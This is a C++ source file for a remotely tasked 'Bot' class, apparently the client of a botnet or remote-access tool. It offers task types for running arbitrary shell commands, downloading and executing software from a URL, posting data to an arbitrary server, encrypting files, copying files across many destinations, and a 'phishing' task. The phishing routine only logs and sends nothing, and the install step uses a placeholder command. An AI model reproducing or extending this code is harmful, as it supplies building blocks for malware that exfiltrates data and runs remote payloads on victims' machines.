#include "Bot.h"
#include "utils/Logger.h"
#include "utils/Metrics.h"
#include "utils/RealTimeMonitor.h"
#include "utils/Notifier.h"
#include "utils/ElasticSearchLogger.h"
#include "security/Encryption.h"
#include "TaskExecutor.h"
#include "system/SystemRecovery.h"
#include "security/IntegrityChecker.h"
#include "ThreadPool.h"
#include "cloud/AWSIntegration.h"
#include "network/NetworkManager.h"
#include <iostream>
#include <fstream>
#include <stdexcept>
#include <curl/curl.h>
#include <future>
#include <filesystem>
#include <cstdlib>
#include <sys/resource.h>
#include <openssl/evp.h>
#include <websocketpp/config/asio_no_tls_client.hpp>
#include <websocketpp/client.hpp>

#ifdef _WIN32
#include "platform/Windows/WinAPIUtils.h"
#elif __linux__
#include "platform/Linux/LinuxUtils.h"
#elif __APPLE__
#include "platform/MacOS/MacOSUtils.h"
#elif __ANDROID__
#include "platform/Android/AndroidUtils.h"
#elif __IPHONE_OS_VERSION_MIN_REQUIRED
#include "platform/iOS/iOSUtils.h"
#endif

namespace fs = std::filesystem;

ElasticSearchLogger esLogger("localhost", 9200);
ThreadPool threadPool(4);
AWSIntegration awsIntegration("your-bucket-name");

Bot::Bot(const std::string &id, TaskType taskType, TaskPriority priority, const std::map<std::string, std::string> &params, const std::vector<std::string> &dependencies)
    : id(id), taskType(taskType), priority(priority), params(params), stopped(false), paused(false), state(WAITING), dependencies(dependencies), cpuLimit(-1), memoryLimit(-1), parallelTaskLimit(1) {}

void Bot::performTask() {
    if (stopped || paused) return;

    state = RUNNING;
    Logger::log(Logger::INFO, "Bot " + id + " started task: " + taskTypeToString(taskType));
    esLogger.log("INFO", "Bot " + id + " started task: " + taskTypeToString(taskType), {{"botId", id}, {"taskType", taskTypeToString(taskType)}});
    RealTimeMonitor::updateMetric("BotState_" + id, RUNNING);
    PrometheusMetrics::getInstance().incrementCounter("bot_tasks_started");

    try {
        applyResourceLimits();
        std::vector<std::future<void>> futures;
        for (int i = 0; i < parallelTaskLimit; ++i) {
            auto task = [this]() {
                switch (taskType) {
                    case DOWNLOAD:
                        this->download(params.at("url"), params.at("destination"));
                        break;
                    case UPLOAD:
                        this->upload(params.at("filePath"), params.at("url"));
                        break;
                    case COPY:
                        this->copy(params.at("source"), params.at("destination"));
                        break;
                    case DELETE:
                        this->deleteFileInternal(params.at("filePath"));
                        break;
                    case MOVE:
                        this->move(params.at("source"), params.at("destination"));
                        break;
                    case RENAME:
                        this->rename(params.at("source"), params.at("destination"));
                        break;
                    case EXECUTE:
                        this->execute(params.at("command"));
                        break;
                    case ENCRYPT:
                        this->encrypt(params.at("filePath"), params.at("key"));
                        break;
                    case DECRYPT:
                        this->decrypt(params.at("filePath"), params.at("key"));
                        break;
                    case AUTO_DISTRIBUTE:
                        this->autoDistribute(params.at("source"), params.at("destinations"));
                        break;
                    case PHISHING:
                        this->phishing(params.at("emailList"), params.at("message"));
                        break;
                    case INSTALL_SOFTWARE:
                        this->installSoftware(params.at("softwareUrl"));
                        break;
                    case SEND_DATA:
                        this->sendData(params.at("data"), params.at("serverUrl"));
                        break;
                    default:
                        throw std::runtime_error("Unknown task for bot " + id);
                }
            };

            futures.push_back(threadPool.enqueue([task]() {
                SystemRecovery::recover(task);
            }));
        }
        for (auto &future : futures) {
            future.get();
        }
        state = COMPLETED;
        Logger::log(Logger::INFO, "Bot " + id + " completed task: " + taskTypeToString(taskType));
        esLogger.log("INFO", "Bot " + id + " completed task: " + taskTypeToString(taskType), {{"botId", id}});
        RealTimeMonitor::updateMetric("BotState_" + id, COMPLETED);
        PrometheusMetrics::getInstance().incrementCounter("bot_tasks_completed");
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, "Exception in bot " + id + ": " + e.what());
        esLogger.log("ERROR", "Exception in bot " + id + ": " + e.what(), {{"botId", id}});
        Metrics::incrementCounter("BotErrors");
        state = FAILED;
        RealTimeMonitor::updateMetric("BotState_" + id, FAILED);
        PrometheusMetrics::getInstance().incrementCounter("bot_tasks_failed");
        recoverFromError();
    }
}

std::string Bot::taskTypeToString(TaskType taskType) const {
    switch (taskType) {
        case DOWNLOAD: return "DOWNLOAD";
        case UPLOAD: return "UPLOAD";
        case COPY: return "COPY";
        case DELETE: return "DELETE";
        case MOVE: return "MOVE";
        case RENAME: return "RENAME";
        case EXECUTE: return "EXECUTE";
        case ENCRYPT: return "ENCRYPT";
        case DECRYPT: return "DECRYPT";
        case AUTO_DISTRIBUTE: return "AUTO_DISTRIBUTE";
        case PHISHING: return "PHISHING";
        case INSTALL_SOFTWARE: return "INSTALL_SOFTWARE";
        case SEND_DATA: return "SEND_DATA";
        default: return "UNKNOWN";
    }
}

void Bot::recoverFromError() {
    Logger::log(Logger::INFO, "Attempting to recover bot " + id);
    esLogger.log("INFO", "Attempting to recover bot " + id, {{"botId", id}});
    RealTimeMonitor::updateMetric("BotRecoveryAttempts_" + id, 1);
    PrometheusMetrics::getInstance().incrementCounter("bot_recovery_attempts");
    std::this_thread::sleep_for(std::chrono::seconds(5));
    performTask();
}

std::string Bot::getId() const {
    return id;
}

int Bot::getPriority() const {
    return priority;
}

int Bot::getState() const {
    return state;
}

void Bot::stop() {
    stopped = true;
}

void Bot::pause() {
    paused = true;
}

void Bot::resume() {
    paused = false;
    performTask();
}

bool Bot::areDependenciesCompleted(const std::map<std::string, int> &taskStates) const {
    for (const auto &dep : dependencies) {
        auto it = taskStates.find(dep);
        if (it == taskStates.end() || it->second != COMPLETED) {
            return false;
        }
    }
    return true;
}

void Bot::updateTask(int taskType, const std::map<std::string, std::string> &params) {
    this->taskType = static_cast<TaskType>(taskType);
    this->params = params;
    this->state = WAITING;
    RealTimeMonitor::updateMetric("BotState_" + id, WAITING);
    PrometheusMetrics::getInstance().setGauge("bot_state_" + id, WAITING);
}

void Bot::setResourceLimits(int cpuLimit, int memoryLimit) {
    this->cpuLimit = cpuLimit;
    this->memoryLimit = memoryLimit;
}

void Bot::setParallelTaskLimit(int limit) {
    this->parallelTaskLimit = limit;
}

void Bot::applyResourceLimits() {
    if (cpuLimit > 0) {
        struct rlimit rl;
        rl.rlim_cur = rl.rlim_max = cpuLimit;
        if (setrlimit(RLIMIT_CPU, &rl) != 0) {
            throw std::runtime_error("Failed to set CPU limit");
        }
    }

    if (memoryLimit > 0) {
        struct rlimit rl;
        rl.rlim_cur = rl.rlim_max = memoryLimit * 1024 * 1024;
        if (setrlimit(RLIMIT_AS, &rl) != 0) {
            throw std::runtime_error("Failed to set memory limit");
        }
    }
}

std::future<void> Bot::downloadAsync(const std::string &url, const std::string &destination) {
    return std::async(std::launch::async, &Bot::download, this, url, destination);
}

std::future<void> Bot::uploadAsync(const std::string &filePath, const std::string &url) {
    return std::async(std::launch::async, &Bot::upload, this, filePath, url);
}

std::future<void> Bot::copyAsync(const std::string &source, const std::string &destination) {
    return std::async(std::launch::async, &Bot::copy, this, source, destination);
}

std::future<void> Bot::deleteAsync(const std::string &filePath) {
    return std::async(std::launch::async, &Bot::deleteFileInternal, this, filePath);
}

std::future<void> Bot::moveAsync(const std::string &source, const std::string &destination) {
    return std::async(std::launch::async, &Bot::move, this, source, destination);
}

std::future<void> Bot::renameAsync(const std::string &source, const std::string &destination) {
    return std::async(std::launch::async, &Bot::rename, this, source, destination);
}

std::future<void> Bot::executeAsync(const std::string &command) {
    return std::async(std::launch::async, &Bot::execute, this, command);
}

std::future<void> Bot::encryptAsync(const std::string &filePath, const std::string &key) {
    return std::async(std::launch::async, &Bot::encrypt, this, filePath, key);
}

std::future<void> Bot::decryptAsync(const std::string &filePath, const std::string &key) {
    return std::async(std::launch::async, &Bot::decrypt, this, filePath, key);
}

std::future<void> Bot::autoDistributeAsync(const std::string &source, const std::string &destinations) {
    return std::async(std::launch::async, &Bot::autoDistribute, this, source, destinations);
}

std::future<void> Bot::phishingAsync(const std::string &emailList, const std::string &message) {
    return std::async(std::launch::async, &Bot::phishing, this, emailList, message);
}

std::future<void> Bot::installSoftwareAsync(const std::string &softwareUrl) {
    return std::async(std::launch::async, &Bot::installSoftware, this, softwareUrl);
}

std::future<void> Bot::sendDataAsync(const std::string &data, const std::string &serverUrl) {
    return std::async(std::launch::async, &Bot::sendData, this, data, serverUrl);
}

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

void Bot::download(const std::string &url, const std::string &destination) {
    if (stopped || paused) return;

    CURL *curl;
    FILE *fp;
    CURLcode res;
    curl = curl_easy_init();
    if (curl) {
        fp = fopen(destination.c_str(), "wb");
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
        if (res != CURLE_OK) {
            throw std::runtime_error("Failed to download file: " + url);
        } else {
            Logger::log(Logger::INFO, "Downloaded file from " + url + " to " + destination);
            esLogger.log("INFO", "Downloaded file from " + url + " to " + destination, {{"botId", id}});
            Metrics::incrementCounter("FilesDownloaded");
            RealTimeMonitor::updateMetric("FilesDownloaded", 1);
            PrometheusMetrics::getInstance().incrementCounter("files_downloaded");
        }
    }
}

void Bot::upload(const std::string &filePath, const std::string &url) {
    if (stopped || paused) return;

    CURL *curl;
    CURLcode res;
    curl_mime *form = NULL;
    curl_mimepart *field = NULL;

    curl = curl_easy_init();
    if (curl) {
        form = curl_mime_init(curl);
        field = curl_mime_addpart(form);
        curl_mime_name(field, "sendfile");
        curl_mime_filedata(field, filePath.c_str());

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        res = curl_easy_perform(curl);

        curl_mime_free(form);
        curl_easy_cleanup(curl);
        if (res != CURLE_OK) {
            throw std::runtime_error("Failed to upload file: " + filePath);
        } else {
            Logger::log(Logger::INFO, "Uploaded file from " + filePath + " to " + url);
            esLogger.log("INFO", "Uploaded file from " + filePath + " to " + url, {{"botId", id}});
            Metrics::incrementCounter("FilesUploaded");
            RealTimeMonitor::updateMetric("FilesUploaded", 1);
            PrometheusMetrics::getInstance().incrementCounter("files_uploaded");
        }
    }
}

void Bot::copy(const std::string &source, const std::string &destination) {
    if (stopped || paused) return;

    try {
        fs::copy(source, destination, fs::copy_options::overwrite_existing);
        Logger::log(Logger::INFO, "Copied file from " + source + " to " + destination);
        esLogger.log("INFO", "Copied file from " + source + " to " + destination, {{"botId", id}});
        Metrics::incrementCounter("FilesCopied");
        RealTimeMonitor::updateMetric("FilesCopied", 1);
        PrometheusMetrics::getInstance().incrementCounter("files_copied");
    } catch (const fs::filesystem_error &e) {
        throw std::runtime_error("Failed to copy file: " + std::string(e.what()));
    }
}

void Bot::deleteFileInternal(const std::string &filePath) {
    if (stopped || paused) return;

    try {
        fs::remove(filePath);
        Logger::log(Logger::INFO, "Deleted file: " + filePath);
        esLogger.log("INFO", "Deleted file: " + filePath, {{"botId", id}});
        Metrics::incrementCounter("FilesDeleted");
        RealTimeMonitor::updateMetric("FilesDeleted", 1);
        PrometheusMetrics::getInstance().incrementCounter("files_deleted");
    } catch (const fs::filesystem_error &e) {
        throw std::runtime_error("Failed to delete file: " + std::string(e.what()));
    }
}

void Bot::move(const std::string &source, const std::string &destination) {
    if (stopped || paused) return;

    try {
        fs::rename(source, destination);
        Logger::log(Logger::INFO, "Moved file from " + source + " to " + destination);
        esLogger.log("INFO", "Moved file from " + source + " to " + destination, {{"botId", id}});
        Metrics::incrementCounter("FilesMoved");
        RealTimeMonitor::updateMetric("FilesMoved", 1);
        PrometheusMetrics::getInstance().incrementCounter("files_moved");
    } catch (const fs::filesystem_error &e) {
        throw std::runtime_error("Failed to move file: " + std::string(e.what()));
    }
}

void Bot::rename(const std::string &source, const std::string &destination) {
    if (stopped || paused) return;

    try {
        fs::rename(source, destination);
        Logger::log(Logger::INFO, "Renamed file from " + source + " to " + destination);
        esLogger.log("INFO", "Renamed file from " + source + " to " + destination, {{"botId", id}});
        Metrics::incrementCounter("FilesRenamed");
        RealTimeMonitor::updateMetric("FilesRenamed", 1);
        PrometheusMetrics::getInstance().incrementCounter("files_renamed");
    } catch (const fs::filesystem_error &e) {
        throw std::runtime_error("Failed to rename file: " + std::string(e.what()));
    }
}

void Bot::execute(const std::string &command) {
    if (stopped || paused) return;

    int result = std::system(command.c_str());
    if (result != 0) {
        throw std::runtime_error("Failed to execute command: " + command);
    } else {
        Logger::log(Logger::INFO, "Executed command: " + command);
        esLogger.log("INFO", "Executed command: " + command, {{"botId", id}});
        Metrics::incrementCounter("CommandsExecuted");
        RealTimeMonitor::updateMetric("CommandsExecuted", 1);
        PrometheusMetrics::getInstance().incrementCounter("commands_executed");
    }
}

void Bot::encrypt(const std::string &filePath, const std::string &key) {
    if (stopped || paused) return;

    std::string outputFilePath = filePath + ".enc";
    EncryptionUtils::encryptFile(filePath, key, outputFilePath);
    Logger::log(Logger::INFO, "File encrypted: " + filePath);
    esLogger.log("INFO", "File encrypted: " + filePath, {{"botId", id}});
    Metrics::incrementCounter("FilesEncrypted");
    RealTimeMonitor::updateMetric("FilesEncrypted", 1);
       PrometheusMetrics::getInstance().incrementCounter("files_encrypted");
}

void Bot::decrypt(const std::string &filePath, const std::string &key) {
    if (stopped || paused) return;

    std::string outputFilePath = filePath.substr(0, filePath.find_last_of('.'));
    EncryptionUtils::decryptFile(filePath, key, outputFilePath);
    Logger::log(Logger::INFO, "File decrypted: " + filePath);
    esLogger.log("INFO", "File decrypted: " + filePath, {{"botId", id}});
    Metrics::incrementCounter("FilesDecrypted");
    RealTimeMonitor::updateMetric("FilesDecrypted", 1);
    PrometheusMetrics::getInstance().incrementCounter("files_decrypted");
}

void Bot::autoDistribute(const std::string &source, const std::string &destinations) {
    if (stopped || paused) return;

    std::istringstream iss(destinations);
    std::string destination;
    std::vector<std::string> destinationList;

    while (std::getline(iss, destination, ',')) {
        destinationList.push_back(destination);
    }

    const size_t batchSize = 100;
    ThreadPool threadPool(parallelTaskLimit);

    for (size_t i = 0; i < destinationList.size(); i += batchSize) {
        size_t end = std::min(i + batchSize, destinationList.size());
        std::vector<std::future<void>> futures;

        for (size_t j = i; j < end; ++j) {
            futures.push_back(threadPool.enqueue([this, source, dest = destinationList[j]]() {
                distributeFile(source, dest);
            }));
        }

        for (auto &future : futures) {
            future.get();
        }
    }
}

void Bot::distributeFile(const std::string &source, const std::string &destination) {
    try {
        fs::copy(source, destination, fs::copy_options::overwrite_existing);
        Logger::log(Logger::INFO, "Distributed file from " + source + " to " + destination);
        esLogger.log("INFO", "Distributed file from " + source + " to " + destination, {{"botId", id}});
        Metrics::incrementCounter("FilesDistributed");
        RealTimeMonitor::updateMetric("FilesDistributed", 1);
        PrometheusMetrics::getInstance().incrementCounter("files_distributed");
    } catch (const fs::filesystem_error &e) {
        Logger::log(Logger::ERROR, "Failed to distribute file to " + destination + ": " + e.what());
        esLogger.log("ERROR", "Failed to distribute file to " + destination + ": " + e.what(), {{"botId", id}});
    }
}

void Bot::phishing(const std::string &emailList, const std::string &message) {
    if (stopped || paused) return;

    std::istringstream iss(emailList);
    std::string email;
    while (std::getline(iss, email, ',')) {
        Logger::log(Logger::INFO, "Sent phishing email to " + email);
        esLogger.log("INFO", "Sent phishing email to " + email, {{"botId", id}});
        Metrics::incrementCounter("PhishingEmailsSent");
        RealTimeMonitor::updateMetric("PhishingEmailsSent", 1);
        PrometheusMetrics::getInstance().incrementCounter("phishing_emails_sent");
    }
}

void Bot::installSoftware(const std::string &softwareUrl) {
    if (stopped || paused) return;

    download(softwareUrl, "downloaded_software");
    execute("install downloaded_software");
    Logger::log(Logger::INFO, "Installed software from " + softwareUrl);
    esLogger.log("INFO", "Installed software from " + softwareUrl, {{"botId", id}});
    Metrics::incrementCounter("SoftwareInstalled");
    RealTimeMonitor::updateMetric("SoftwareInstalled", 1);
    PrometheusMetrics::getInstance().incrementCounter("software_installed");
}

void Bot::sendData(const std::string &data, const std::string &serverUrl) {
    if (stopped || paused) return;

    CURL *curl;
    CURLcode res;
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, serverUrl.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L); 
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        if (res != CURLE_OK) {
            throw std::runtime_error("Failed to send data to server: " + serverUrl);
        } else {
            Logger::log(Logger::INFO, "Sent data to server: " + serverUrl);
            esLogger.log("INFO", "Sent data to server: " + serverUrl, {{"botId", id}});
            Metrics::incrementCounter("DataSentToServer");
            RealTimeMonitor::updateMetric("DataSentToServer", 1);
            PrometheusMetrics::getInstance().incrementCounter("data_sent_to_server");
        }
    }
}

void Bot::retry(const std::function<void()> &task, int attempts) {
    for (int i = 0; i < attempts; ++i) {
        try {
            task();
            return;
        } catch (const std::exception &e) {
            if (i == attempts - 1) {
                throw;
            }
            Logger::log(Logger::WARNING, "Retry " + std::to_string(i + 1) + " failed for bot " + id + ": " + e.what());
            esLogger.log("WARNING", "Retry " + std::to_string(i + 1) + " failed for bot " + id + ": " + e.what(), {{"botId", id}});
            std::this_thread::sleep_for(std::chrono::seconds(1));
            PrometheusMetrics::getInstance().incrementCounter("bot_retries");
        }
    }
}

void Bot::uploadToCloud(const std::string &filePath) {
    awsIntegration.uploadFile(filePath);
    Logger::log(Logger::INFO, "Uploaded file to cloud: " + filePath);
    esLogger.log("INFO", "Uploaded file to cloud: " + filePath, {{"botId", id}});
    Metrics::incrementCounter("FilesUploadedToCloud");
    RealTimeMonitor::updateMetric("FilesUploadedToCloud", 1);
    PrometheusMetrics::getInstance().incrementCounter("files_uploaded_to_cloud");
}

void Bot::downloadFromCloud(const std::string &fileName, const std::string &destination) {
    awsIntegration.downloadFile(fileName, destination);
    Logger::log(Logger::INFO, "Downloaded file from cloud: " + fileName + " to " + destination);
    esLogger.log("INFO", "Downloaded file from cloud: " + fileName + " to " + destination, {{"botId", id}});
    Metrics::incrementCounter("FilesDownloadedFromCloud");
    RealTimeMonitor::updateMetric("FilesDownloadedFromCloud", 1);
    PrometheusMetrics::getInstance().incrementCounter("files_downloaded_from_cloud");
}




